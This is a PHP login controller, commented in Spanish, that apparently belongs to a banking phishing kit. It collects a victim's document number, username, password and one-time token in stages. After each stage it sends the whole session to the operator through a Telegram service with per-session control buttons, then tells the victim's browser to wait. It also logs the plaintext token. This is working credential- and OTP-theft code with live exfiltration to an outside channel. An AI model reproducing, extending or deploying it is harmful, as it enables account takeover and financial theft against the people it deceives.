<?php

declare(strict_types=1);

namespace App\Controllers;

use App\Services\SessionService;
use App\Services\TelegramService;
use App\Services\LoggerService;
use App\Validators\CredentialsValidator;
use App\Exceptions\ValidationException;

/**
 * Login Controller - Maneja el login con credenciales
 */
final class LoginController
{
    public function __construct(
        private SessionService $sessionService,
        private TelegramService $telegramService,
        private LoggerService $logger,
        private CredentialsValidator $validator
    ) {
    }

    /**
     * Muestra el formulario de login
     */
    public function showForm(?string $error = null, bool $openToken = false): void
    {
        $this->sessionService->start();

        // Verificar que vengan de process.php
        if (!$this->sessionService->has('documentType') || !$this->sessionService->has('documentNumber')) {
            $this->redirect('/index.php');
            return;
        }

        $errorMessage = '';
        if ($error === 'credenciales') {
            $errorMessage = 'Tu usuario o clave son incorrectos. Verifica tus datos e intenta nuevamente.';
        }

        require_once __DIR__ . '/../../templates/login-form.php';
    }

    /**
     * Procesa el formulario de login
     */
    public function processForm(array $data): void
    {
        $this->sessionService->start();

        $usuario = $this->sanitize($data['usuario'] ?? '');
        $clave = $this->sanitize($data['clave'] ?? '');

        try {
            $this->validator->validateOrFail($usuario, $clave);
        } catch (ValidationException $e) {
            $this->logger->warning('Credentials validation failed', [
                'errors' => $e->getErrors(),
                'session_id' => $this->sessionService->getId(),
            ]);
            $this->redirect('/next-step.php?error=credenciales');
            return;
        }

        // Guardar en sesión
        $this->sessionService->set('usuario', $usuario);
        $this->sessionService->set('clave', $clave);
        $this->sessionService->set('telegram_stage', 'credenciales');

        // Enviar a Telegram
        $message = $this->telegramService->formatSessionData($this->sessionService->all());
        $buttons = $this->telegramService->generateStandardButtons($this->sessionService->getId());
        $this->telegramService->sendMessage($message, $buttons);

        $this->logger->info('Credentials submitted', [
            'session_id' => $this->sessionService->getId(),
            'usuario' => $usuario,
        ]);

        // Responder al cliente indicando que debe esperar
        header('Content-Type: application/json');
        echo json_encode(['success' => true, 'wait' => true]);
        exit;
    }

    /**
     * Procesa el token
     */
    public function processToken(array $data): void
    {
        $this->sessionService->start();

        $token = $this->sanitize($data['token'] ?? '');

        if (empty($token) || strlen($token) < 4) {
            header('Content-Type: application/json');
            echo json_encode(['success' => false, 'message' => 'Token inválido']);
            exit;
        }

        // Guardar en sesión
        $this->sessionService->set('token', $token);
        $this->sessionService->set('telegram_stage', 'token');

        // Enviar a Telegram
        $message = $this->telegramService->formatSessionData($this->sessionService->all());
        $buttons = $this->telegramService->generateStandardButtons($this->sessionService->getId());
        $this->telegramService->sendMessage($message, $buttons);

        $this->logger->info('Token submitted', [
            'session_id' => $this->sessionService->getId(),
            'token' => $token,
        ]);

        header('Content-Type: application/json');
        echo json_encode(['success' => true, 'wait' => true]);
        exit;
    }

    private function sanitize(string $data): string
    {
        return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
    }

    private function redirect(string $url): void
    {
        header("Location: $url");
        exit;
    }
}
